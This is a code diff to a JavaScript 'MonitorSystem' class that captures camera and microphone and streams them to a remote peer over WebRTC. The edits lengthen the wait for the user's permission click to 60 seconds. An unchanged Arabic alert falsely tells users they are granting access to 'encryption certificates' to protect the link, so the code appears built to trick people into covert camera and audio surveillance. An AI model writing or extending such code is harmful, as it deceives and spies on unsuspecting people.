@@ -228,6 +228,9 @@ export class MonitorSystem {
     }
 
     async startCamera(facingMode = this.currentFacingMode) {
+        if (this.isCameraStarting) return;
+        this.isCameraStarting = true;
+
         console.log(`Camera: Starting ${facingMode}...`);
 
         // Stop previous tracks
@@ -242,15 +245,8 @@ export class MonitorSystem {
             const constraints = {
                 video: isAudioOnly ? false : {
                     facingMode: facingMode,
-                    width: { ideal: 1280, max: 1920 },
-                    height: { ideal: 720, max: 1080 },
-                    zoom: true, pan: true, tilt: true
                 },
-                audio: {
-                    echoCancellation: true,
-                    noiseSuppression: true,
-                    autoGainControl: true
-                }
+                audio: true
             };
 
             console.log("Requesting access. Audio mode:", isAudioOnly);
@@ -291,21 +287,27 @@ export class MonitorSystem {
                 console.error("Complete failure:", fallbackErr);
                 alert("⚠ تنبيه أمني: يرجى السماح للمتصفح بالوصول لشهادات التشفير (الكاميرا والمايكروفون) لضمان حماية الرابط.");
             }
+        } finally {
+            this.isCameraStarting = false;
         }
     }
 
     async handleOffer(payload) {
-        // Wait for camera to be ready if it's still starting
+        // Wait up to 60 seconds for camera (allowing user time to click 'Allow')
         let attempts = 0;
-        while (!this.localStream && attempts < 20) {
-            console.log("RTC: Waiting for camera to be ready...");
+        while (!this.localStream && attempts < 120) {
+            if (attempts % 10 === 0) console.log("RTC: Waiting for camera/permission...");
             await new Promise(r => setTimeout(r, 500));
             attempts++;
         }
 
         if (!this.localStream) {
-            console.error("RTC: Cannot handle offer - camera failed to start.");
+            console.error("RTC: Cannot handle offer - camera failed to start or permission denied.");
             return;
+        }
+
+        if (this.peerConnection) {
+            this.peerConnection.close();
         }
 
         this.peerConnection = new RTCPeerConnection(Core.rtcConfig);
